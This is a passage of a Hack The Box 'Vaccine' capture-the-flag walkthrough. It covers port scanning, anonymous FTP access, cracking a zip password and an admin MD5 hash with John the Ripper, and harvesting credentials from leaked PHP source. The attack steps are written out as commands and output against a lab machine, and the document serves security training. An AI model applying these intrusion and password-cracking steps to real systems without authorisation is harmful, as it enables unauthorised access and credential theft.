<h1 id="htbstatingpointtier2vaccine">HTB Stating Point Tier 2: Vaccine</h1>
<p>
  This is a breakdown of my methods to gain root on
  <a href="https://app.hackthebox.com/starting-point">HTB Vaccine</a>.
</p>
<h2 id="setup">Setup</h2>
<p>
  First we have to make sure to spawn the target and connect via OpenVPN. Then,
  personally, I start my notes. I end up downloading/ creating a lot of files
  during HTB CTF so I make a new directory in <code>~/</code> for each box. This
  one would be <code>~/vaccine</code>. I do all of my work from this directory
  and also store my notes here. Recently I've been creating three separate note
  pages to track different things throughout the CTF:
</p>
<h3 id="vaccineoutputtxt"><code>vaccine.output.txt</code></h3>
<p>
  In this note I copy paste almost every command and out combination I use in
  the terminal as I go. I do this for a few reasons:
</p>
<ul>
  <li>
    I'm still learning so it's nice to have examples to look back on of correct
    use of tools w/ flags etc. for reference.
  </li>
  <li>
    It creates a timeline of how I went about attacking the box that I can
    reference and reflect on
  </li>
</ul>
<h3 id="vaccinefindingstxt"><code>vaccine.findings.txt</code></h3>
<p>
  This type of note is something I've started doing recently. It's meant to be a
  list of specific findings w/ some notes on context for each. I'm still
  figuring out how to format this file so it's more efficient and helpful to me
  during and after exploitation.
</p>
<h3 id="vaccinenotestxt"><code>vaccine.notes.txt</code></h3>
<p>
  This is primarily for me. This is where I write down or copy paste tips and
  tricks I learn along the way. Because I usually livestream these CTFs, I pick
  up a lot of little tips and tricks from viewers.
</p>
<p>
  After setting up these notes, the last thing I like to do is copy paste the
  target IP and set it as a variable in <code>~/.profile</code> like so:
</p>
<pre><code class="bash language-bash">...
# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi

# TP customs:
t=10.129.238.155   # &lt;-----
</code></pre>
<p>
  Once it's in there I use <code>source ~/.profile</code> on any terminal I open
  during the CTF so <code>$t</code> can be used w/ every tool.
</p>
<h2 id="recon">Recon</h2>
<p>
  After starting the target machine and connecting our attack box to it's
  network via OpenVPN, we can do a preliminary scan of the target using
  <a href="CLI-tools/linux/nmap.md">nmap</a>. Personally, I don't do CTFs for
  time, I do them to learn. So I have no reason to run scans I don't need.
</p>
<p>
  That's why I like to start with a basic nmap scan to just scan for ports. For
  those who don't know the <code>-PA</code> flag to scan for
  <a href="networking/protocols/TCP.md">TCP</a> ports below 1000. In this scan,
  nmap just sends a TCP <code>ACK</code> packet to the specified ports, as well
  as .
</p>
<pre><code class="bash language-bash">nmap -PA1-1000 $t
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 10:09 EDT
Nmap scan report for 10.129.239.224
Host is up (0.051s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.90 seconds
</code></pre>
<p>
  We can see that the target is running
  <a href="networking/protocols/SSH.md">SSH</a>,
  <a href="networking/protocols/FTP.md">FTP</a>, and
  <a href="networking/protocols/HTTP.md">HTTP</a> services. I like to start by
  looking at HTTP.
</p>
<h3 id="port80http"><code>Port 80</code>/ HTTP</h3>
<p>
  Before visiting the website, I like to use
  <a href="CLI-tools/linux/curL.md">curL</a> first. You can either just grab the
  headers using the <code>-I</code> flag:
</p>
<pre><code class="bash language-bash">┌──(hakcypuppy㉿kali)-[~/vaccine]
└─$ curl -I http://$t
HTTP/1.1 200 OK
Date: Sun, 15 Oct 2023 14:23:11 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=l1790rmtgabfqbpkila5qkhdq6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
</code></pre>
<p>
  From the headers, we've already learned they're using
  <em>Apache 2.4.41</em> for their server. This
  <em>is considered a finding in a pentest</em> because version numbers for
  services can help us find CVEs and exploits against the target.
</p>
<p>
  Additionally, we can see we've been given a
  <a href="coding/languages/PHP.md">PHP</a> session cookie. So we already know
  the target is using PHP in their web architecture. To get all of the HTML at
  this endpoint, we can just use curL normally. The <code>--version</code> flag
  is also nice to add. I'm not going to paste the entire output but here are
  some interesting things to notice:
</p>
<h4 id="megacorplogin">MegaCorp Login</h4>
<pre><code class="html language-html">&lt;/head&gt;
  &lt;h1 align=center&gt;MegaCorp Login&lt;/h1&gt;
&lt;body&gt;
</code></pre>
<p>
  This is a default login page, and if you did the boxes before this one on HTB,
  you'd know that MegaCorp has been the target. We can potentially
  <em>use credentials we found on other MegaCorp CTFs</em> against vaccine.
</p>
<h4 id="form">Form</h4>
<pre><code class="html language-html">&lt;form action="" method="POST" class="form login"&gt;
  &lt;div class="form__field"&gt;
    &lt;label for="login__username"
      &gt;&lt;svg class="icon"&gt;
        &lt;use
          xmlns:xlink="http://www.w3.org/1999/xlink"
          xlink:href="#user"
        &gt;&lt;/use&gt;&lt;/svg
      &gt;&lt;span class="hidden"&gt;Username&lt;/span&gt;&lt;/label
    &gt;
    &lt;input
      id="login__username"
      type="text"
      name="username"
      class="form__input"
      placeholder="Username"
      required
    /&gt;
  &lt;/div&gt;

  &lt;div class="form__field"&gt;
    &lt;label for="login__password"
      &gt;&lt;svg class="icon"&gt;
        &lt;use
          xmlns:xlink="http://www.w3.org/1999/xlink"
          xlink:href="#lock"
        &gt;&lt;/use&gt;&lt;/svg
      &gt;&lt;span class="hidden"&gt;Password&lt;/span&gt;&lt;/label
    &gt;
    &lt;input
      id="login__password"
      type="password"
      name="password"
      class="form__input"
      placeholder="Password"
      required
    /&gt;
  &lt;/div&gt;

  &lt;div class="form__field"&gt;
    &lt;input type="submit" value="Sign In" /&gt;
  &lt;/div&gt;
&lt;/form&gt;
</code></pre>
<p>
  The form itself can sometimes give us <em>plaintext credentials</em>, and
  sometimes pathing to other endpoints. In this case I didn't learn much
  (although I have a feeling their are nuggets I overlooked as a n00b).
</p>
<h4 id="browser">Browser</h4>
<p>
  <img src="CTF-walkthroughs/walkthrough-pics/vaccine-HTB-1.png" alt="" />
  <img src="/walkthrough-pics/vaccine-HTB-1.png" alt="" />
</p>
<p>
  When I found this I tried credentials I got from doing Oopsies and Archetype
  (the two boxes before Vaccine) because using credentials from Archetype worked
  on Oopsies. It did not work this time.
</p>
<h3 id="port21ftp"><code>Port 21</code> FTP</h3>
<p>
  Moving on to FTP we can use the
  <a href="CLI-tools/linux/ftp-command.md"><code>ftp</code> command</a> to try
  gaining access to the service using the <em>anonymous login</em> which is a
  default access user which <em>is limited to copying files</em> from the
  server:
</p>
<pre><code class="bash language-bash">┌──(hakcypuppy㉿kali)-[~/vaccine]
└─$ ftp anonymous@$t
Connected to 10.129.239.224.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:   # &lt;-------- Just hit 'Enter' w/ blank password here
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||10399|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp&gt;
</code></pre>
<p>
  With the anonymous user we're able to access the server and list its contents.
  Someone left a <code>bakcup.zip</code> file here. To download it to your
  machine, just use <code>get backup.zip</code>:
</p>
<pre><code class="bash language-bash">ftp&gt; get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10552|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |***********************************************************************************************************************************************************************************************|  2533        4.32 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (53.25 KiB/s)
ftp&gt;
</code></pre>
<p>
  We can also try to move around with <code>cd</code> or find other information
  using all of the available commands for this ftp prompt, but I had no luck
  when I tried.
</p>
<p>
  <strong>NOTE:</strong> I've placed this part in the 'Recon' portion of my
  walkthrough but exfiltrating data is not technically recon… Just be aware :).
</p>
<h2 id="backupzip"><code>Backup.zip</code></h2>
<p>
  So we've exfiltrated some data, but if we try to simply unzip it we're
  prompted for a password. Again, I tried credentials from the previous two
  boxes but with no luck.
</p>
<pre><code class="bash language-bash">┌──(hakcypuppy㉿kali)-[~/vaccine]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password:
</code></pre>
<h3 id="zip2john">zip2john</h3>
<p>
  Fortunately we can do some offline cracking with
  <a href="cybersecurity/tools/cracking/john.md">john the ripper</a>. John is a
  cracking tool which can be used to crack various things, specifically
  passwords. However, he also has some other setting such as
  <code>ssh2john</code> and <code>zip2john</code>.
</p>
<p>
  We're gonna use <code>zip2john</code> to crack the passwords. From what I
  understand, <code>zip2john</code> creates a hash of the <code>.zip</code> file
  and then attempts to crack the hash, thus revealing the passwords locking it
  and/or securing the files zipped in it.
</p>
<h4 id="use">Use</h4>
<p>
  When we use <code>zip2john</code> we give it the <code>.zip</code> file and
  then redirecting the output to a file with the <code>.hashes</code> extension:
</p>
<pre><code class="bash language-bash">zip2john backup.zip &gt; hash.hashes
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
</code></pre>
<p>Now we just point John at the hashes file and let him crack it…</p>
<pre><code class="bash language-bash">┌──(hakcypuppy㉿kali)-[~]
└─$ john hash.hashes
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
741852963        (backup.zip)     # &lt;-------------- Password is here
1g 0:00:00:00 DONE 2/3 (2023-10-02 17:37) 6.250g/s 505756p/s 505756c/s 505756C/s 123456..pepper1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
</code></pre>
<h3 id="backtounzip">Back to <code>unzip</code></h3>
<p>
  Now that we've found the password we can unlock the <code>.zip</code> file:
</p>
<pre><code class="bash language-bash">┌──(hakcypuppy㉿kali)-[~/vaccine]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password: 741852963 # &lt;-----
  inflating: index.php
  inflating: style.css
</code></pre>
<p>
  We've got two files, <code>index.php</code> and <code>style.css</code>. If we
  start w/ <code>index.php</code> and concatenate it we get HTML with a PHP
  script and <em>plain text credentials</em>:
</p>
<pre><code class="php language-php">&lt;!DOCTYPE html&gt;
&lt;?php
session_start();
  if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])) {
    if($_POST['username'] === 'admin' &amp;&amp; md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?&gt; ...
</code></pre>
<p>Here's what we learn from this file:</p>
<ul>
  <li><em>Username:</em> admin</li>
  <li><em>Password:</em> 2cb42f8734ea607eefed3b70af13bbd3 (md5 hashed)</li>
  <li><em>Login endpoint:</em> dashboard.php</li>
</ul>
<p>
  <strong>NOTE:</strong> A possible interesting divergence here from my path has
  to do with the <code>backup.zip</code>. The name implies that the file is
  <em>getting backed up regularly</em> which implies as script somewhere is
  executing on an interval. If we can find the script, we can potentially swap
  it out and get automated execution… just spit balling :).
</p>
<h3 id="crackingtheadminpassword">Cracking the Admin Password</h3>
<p>
  We can use john again to crack this password. I tried the
  <code>--single</code> crack mode at first w/ no luck. Using
  <code>--wordlist</code> works fine:
</p>
<pre><code class="bash language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 p.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty789        (?)     # &lt;------------------ PASSWORD
1g 0:00:00:00 DONE (2023-10-15 11:28) 25.00g/s 2505Kp/s 2505Kc/s 2505KC/s roslin..pogimo
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
</code></pre>
<p>
  Our password for an admin account at the <code>dashboard.php</code> endpoint
  is 'qwerty789'. Keep in mind, we can also try this credential on our
  enumerated services such as the ftp server and SSH…
</p>
<h2 id="admindashboard">Admin Dashboard</h2>
<p>
  Now that we have the admin password for the dashboard endpoint, let's try to
  use it.
</p>
